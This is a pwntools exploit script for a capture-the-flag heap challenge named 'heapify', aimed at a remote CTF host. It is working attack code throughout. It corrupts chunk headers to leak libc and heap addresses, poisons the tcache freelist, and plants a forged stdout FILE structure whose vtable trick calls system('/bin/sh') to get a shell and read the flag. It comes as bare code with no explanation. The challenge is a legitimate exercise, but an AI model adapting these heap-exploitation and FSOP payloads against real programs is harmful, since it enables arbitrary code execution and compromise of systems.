from pwn import *
from icecream import ic
import tty

# Set up pwntools for the correct architecture
exe = "./heapify"
libc = ELF("./libc.so.6")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("challs.actf.co", 31501 )
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    c
'''.format(**locals())

# Useful macros
def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()
eof = chr(tty.CEOF)

r = start()
ind = -1

def alloc(size, data):
    global ind
    sla(b"your choice: ", b'1')
    sla(b"chunk size: ", str(size).encode())
    sla(b"chunk data:", data)
    ind += 1
    return ind

def free(ind):
    sla(b"your choice: ", b'2')
    sla(b"chunk index: ", str(ind).encode())

def view(ind):
    sla(b"your choice: ", b'3')
    sla(b"chunk index: ", str(ind).encode())
    return rl()[:-1]

def enc(val):
    return(heap ^ val)

sh = alloc(0x78, b"/bin/sh\0") # dud

# getting leaks

alloc(0x18, b"AAAA")
alloc(0x118, b"BBBB")
alloc(0x2f8, b"CCCC")
alloc(0x18, b"DDDD")

free(1)
alloc(0x18, b"A"*0x18+p64(0x421))
free(2)
alloc(0x118, b"BBBB")

libc.address = u64(view(3).ljust(8, b"\x00")) - 0x21ace0

ic(hex(libc.address))

x = alloc(0x28, b"JUNK")
free(x)

heap = u64(view(3).ljust(8, b"\x00"))
ic(hex(heap))

# Fsop stack leak
a = alloc(0xf8, b"JUNKJUNK1")
b = alloc(0xf8, b"JUNKJUNK2")
q = alloc(0xf8, b"JUNK")

free(q)
free(b)
free(a)
alloc(0xf8, b"C"*0xf8 + p64(0x101) + p64(enc(libc.address + 0x21b780)))

alloc(0xf8, b"JUNK")

stdout = libc.sym._IO_2_1_stdout_
fake_vtable = libc.sym._IO_wfile_jumps-0x18
gadget = libc.address+0x00000000001636a0
fs = FileStructure(0)
fs.flags = 0x3b01010101010101
fs._IO_read_end=libc.sym.system
fs._IO_save_base = gadget
fs._IO_write_end=u64(b"/bin/sh\x00")
fs._lock=libc.address + 0x21ca70
fs._codecvt= stdout+0xb8
fs._wide_data = stdout+0x200
fs.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

ic(hex(gadget))
alloc(0xf8, bytes(fs))

sl(b"cat flag.txt")

r.interactive()